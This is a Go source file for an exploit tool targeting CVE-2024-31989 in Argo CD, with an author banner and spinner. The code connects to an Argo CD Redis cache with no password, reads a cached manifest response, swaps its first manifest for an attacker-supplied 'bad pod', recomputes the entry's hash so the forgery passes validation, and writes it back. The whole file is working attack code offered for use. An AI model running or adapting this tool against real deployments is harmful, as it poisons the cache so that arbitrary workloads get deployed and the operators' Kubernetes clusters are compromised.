package main

import (
	"bytes"
	"compress/gzip"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"hash/fnv"
	"io"
	"os"
	"strings"
	"time"

	"github.com/argoproj/argo-cd/v2/reposerver/apiclient"
	rediscache "github.com/go-redis/cache/v9"
	"github.com/redis/go-redis/v9"
)

type RedisCompressionType string

var (
	RedisCompressionNone RedisCompressionType = "none"
	RedisCompressionGZip RedisCompressionType = "gzip"
)

type redisCache struct {
	expiration           time.Duration
	client               *redis.Client
	cache                *rediscache.Cache
	redisCompressionType RedisCompressionType
}

func NewRedisCache(client *redis.Client, expiration time.Duration, compressionType RedisCompressionType) *redisCache {
	return &redisCache{
		client:               client,
		expiration:           expiration,
		cache:                rediscache.New(&rediscache.Options{Redis: client}),
		redisCompressionType: compressionType,
	}
}

func (r *redisCache) getKey(key string) string {
	switch r.redisCompressionType {
	case RedisCompressionGZip:
		return key + ".gz"
	default:
		return key
	}
}

func (r *redisCache) marshal(obj interface{}) ([]byte, error) {
	buf := bytes.NewBuffer([]byte{})
	var w io.Writer = buf
	if r.redisCompressionType == RedisCompressionGZip {
		w = gzip.NewWriter(buf)
	}
	encoder := json.NewEncoder(w)

	if err := encoder.Encode(obj); err != nil {
		return nil, err
	}
	if flusher, ok := w.(interface{ Flush() error }); ok {
		if err := flusher.Flush(); err != nil {
			return nil, err
		}
	}
	return buf.Bytes(), nil
}

func (r *redisCache) unmarshal(data []byte, obj interface{}) error {
	buf := bytes.NewReader(data)
	var reader io.Reader = buf
	if r.redisCompressionType == RedisCompressionGZip {
		if gzipReader, err := gzip.NewReader(buf); err != nil {
			return err
		} else {
			reader = gzipReader
		}
	}
	if err := json.NewDecoder(reader).Decode(obj); err != nil {
		return fmt.Errorf("failed to decode cached data: %w", err)
	}
	return nil
}

func (r *redisCache) Set(key string, obj interface{}) error {

	val, err := r.marshal(obj)
	if err != nil {
		return err
	}

	return r.cache.Set(&rediscache.Item{
		Key:   r.getKey(key),
		Value: val,
		TTL:   r.expiration,
		SetNX: false,
	})
}

func (r *redisCache) Get(key string, obj interface{}) error {
	var data []byte
	err := r.cache.Get(context.TODO(), r.getKey(key), &data)
	if errors.Is(err, rediscache.ErrCacheMiss) {
		err = redis.ErrClosed
	}
	if err != nil {
		return err
	}

	return r.unmarshal(data, obj)
}

type CachedManifestResponse struct {
	CacheEntryHash                  string                      `json:"cacheEntryHash"`
	ManifestResponse                *apiclient.ManifestResponse `json:"manifestResponse"`
	MostRecentError                 string                      `json:"mostRecentError"`
	FirstFailureTimestamp           int64                       `json:"firstFailureTimestamp"`
	NumberOfConsecutiveFailures     int                         `json:"numberOfConsecutiveFailures"`
	NumberOfCachedResponsesReturned int                         `json:"numberOfCachedResponsesReturned"`
}

func (cmr *CachedManifestResponse) shallowCopy() *CachedManifestResponse {
	if cmr == nil {
		return nil
	}

	return &CachedManifestResponse{
		CacheEntryHash:                  cmr.CacheEntryHash,
		FirstFailureTimestamp:           cmr.FirstFailureTimestamp,
		ManifestResponse:                cmr.ManifestResponse,
		MostRecentError:                 cmr.MostRecentError,
		NumberOfCachedResponsesReturned: cmr.NumberOfCachedResponsesReturned,
		NumberOfConsecutiveFailures:     cmr.NumberOfConsecutiveFailures,
	}
}

func (cmr *CachedManifestResponse) generateCacheEntryHash() (string, error) {
	copy := cmr.shallowCopy()
	copy.CacheEntryHash = ""

	bytes, err := json.Marshal(copy)
	if err != nil {
		return "", err
	}
	h := fnv.New64a()
	_, err = h.Write(bytes)
	if err != nil {
		return "", err
	}
	fnvHash := h.Sum(nil)
	return base64.URLEncoding.EncodeToString(fnvHash), nil
}

func printBanner() {
	banner := `
 _  _____      _   _ _  _            _    
| |/ ( _ ) ___| | | (_)(_) ____  ___| | __
| ' // _ \/ __| |_| | || |/ _' |/ __| |/ /
| . \ (_) \__ \  _  | || | (_| | (__|   < 
|_|\_\___/|___/_| |_|_|/ |\__,_|\___|_|\_\
                     |__/                 

CVE-2024-31989 - by vt0x78 & D3bu663r`
	fmt.Println(banner)
	fmt.Printf("\n")
}

func spinner(delay time.Duration) {
    for {
        for _, r := range "-\\|/" {
            fmt.Printf("\r%c", r)
			fmt.Printf(" Injecting Key...")
            time.Sleep(delay)
        }
    }
}

func main() {
	printBanner()
	help := flag.Bool("h", false, "Help usage")
	keyFilePath := flag.String("key", "", "Path to redis key name file")
	podFilePath := flag.String("pod", "", "Path to bad pod (json minified/one line)")
	reddisAddr := flag.String("redis-addr", "localhost:6379", "Addres to redis server (default localhost:6379)")

	flag.Parse()

	client := redis.NewClient(&redis.Options{
		Addr:     *reddisAddr,
		Password: "",
		DB:       0,
	})

	rediscache := NewRedisCache(client, time.Hour, RedisCompressionGZip)

	if *help {
		flag.Usage()
		return
	}

	if *keyFilePath == "" || *podFilePath == "" {
		fmt.Println("Both -key and -pod flags are required")
		flag.Usage()
		return
	}

	keyData, err := os.ReadFile(*keyFilePath)
	if err != nil {
		fmt.Println("Error reading key file:", err)
		return
	}
	key := strings.TrimSpace(string(keyData))

	podData, err := os.ReadFile(*podFilePath)
	if err != nil {
		fmt.Println("Error reading pod file:", err)
		return
	}
	badPod := strings.TrimSpace(string(podData))

	go spinner(300 * time.Millisecond)
	time.Sleep(5 * time.Second)

	var cachedManifest CachedManifestResponse

	err = rediscache.Get(key, &cachedManifest)
	if err != nil {
		fmt.Println("Error getting cached manifest:", err)
		return
	}

	cachedManifest.ManifestResponse.Manifests[0] = badPod

	cacheEntryHash, err := cachedManifest.generateCacheEntryHash()
	if err != nil {
		fmt.Println("Error generating CacheEntryHash:", err)
		return
	}
	cachedManifest.CacheEntryHash = cacheEntryHash

	err = rediscache.Set(key, &cachedManifest)
	if err != nil {
		fmt.Println("Error setting cached manifest:", err)
		return
	}else{
		fmt.Printf("\n\nKey set successfully\n\n")
	}
}
